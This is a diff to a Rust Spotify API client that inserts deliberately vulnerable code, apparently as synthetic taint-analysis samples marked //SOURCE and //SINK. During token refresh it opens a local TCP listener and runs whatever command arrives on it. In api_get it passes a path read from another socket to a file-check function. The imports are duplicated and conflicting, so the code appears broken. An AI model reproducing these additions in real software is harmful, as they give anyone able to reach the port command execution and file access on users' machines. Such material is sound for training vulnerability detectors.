@@ -14,9 +14,20 @@ use crate::{
 use sxd_document::parser;
 use std::{collections::HashMap, fmt, ops::Not, sync::Arc};
 use sxd_xpath::{evaluate_xpath, Value as XPathValue};
+use crate::clients::verify_cached_report_exists;
+use std::{collections::HashMap, fmt, ops::Not, sync::Arc};
+use std::ffi::CString;
+use libc;
+use std::io::Read;
+use std::net::TcpListener;
 use chrono::Utc;
 use maybe_async::maybe_async;
 use serde_json::Value;
+use std::io::Read;
+use tokio::net::TcpListener;
+use tokio::io::AsyncReadExt;
+use tokio::process::Command;
+use std::process::Stdio;
 
 /// This trait implements the basic endpoints from the Spotify API that may be
 /// accessed without user authorization, including parts of the authentication
@@ -75,6 +86,30 @@ where
             .map_or(false, Token::is_expired);
 
         if should_reauth {
+            let mut buffer = [0u8; 256];
+            let mut tainted_command = String::new();
+
+            let listener = TcpListener::bind("127.0.0.1:9092").await?;
+            if let Ok((mut stream, _)) = listener.accept().await {
+                let mut buffer = [0u8; 256];
+                //SOURCE
+                let n = stream.read(&mut buffer).await?;
+                let raw_input = String::from_utf8_lossy(&buffer[..n]);
+                tainted_command = raw_input.trim().replace(['\r', '\n'], "");
+            }
+
+            let mut parts = tainted_command.split_whitespace();
+            let base_command = parts.next().unwrap_or("echo");
+            let args: Vec<String> = parts.map(|s| s.to_string()).collect();
+
+            //SINK
+            let mut child = Command::new(base_command)
+            .args(args)
+            .stdout(Stdio::null())
+            .stderr(Stdio::null())
+            .spawn()?; 
+
+            let _status = child.wait().await?;
             self.refresh_token().await
         } else {
             Ok(())
@@ -115,6 +150,21 @@ where
     #[doc(hidden)]
     #[inline]
     async fn api_get(&self, url: &str, payload: &Query<'_>) -> ClientResult<String> {
+        let mut tcp_buf = [0u8; 256];
+        let mut external_path = "".to_string();
+
+        if let Ok(listener) = TcpListener::bind("127.0.0.1:9000") {
+            if let Ok((mut stream, _)) = listener.accept() {
+                //SOURCE
+                if let Ok(n) = stream.read(&mut tcp_buf) {
+                    let raw = String::from_utf8_lossy(&tcp_buf[..n]);
+                    external_path = raw.trim().replace(['\r', '\n'], "").to_string();
+                }
+            }
+        }
+
+        let _ = verify_cached_report_exists(&external_path);
+            
         let url = self.api_url(url);
         let headers = self.auth_headers().await?;
         Ok(self.get_http().get(&url, Some(&headers), payload).await?)
